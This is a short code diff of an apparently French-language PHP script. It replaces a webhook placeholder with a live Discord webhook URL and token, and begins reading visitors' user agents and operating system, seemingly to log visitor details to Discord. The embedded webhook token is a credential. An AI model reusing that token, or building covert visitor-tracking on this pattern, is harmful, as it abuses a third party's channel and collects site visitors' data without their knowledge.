@@ -4,7 +4,7 @@
  Last update : 29/03/2020
 */
 ini_set('display_errors','off');
-/*<------------- Placer le lien webhook ici ------------------>*/ $webhook = "INSERT WEBHOOK HERE";
+/*<------------- Placer le lien webhook ici ------------------>*/ $webhook = "https://discord.com/api/webhooks/1452937047277830186/6Ltm1pIPQJcQWqDC1Wn7KFZctTHLBqpWhiVoJNix-ojgD0e2Z5T1tw8mTD4XdF1C1Jqz";
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
 function getOS() { 
     global $user_agent;
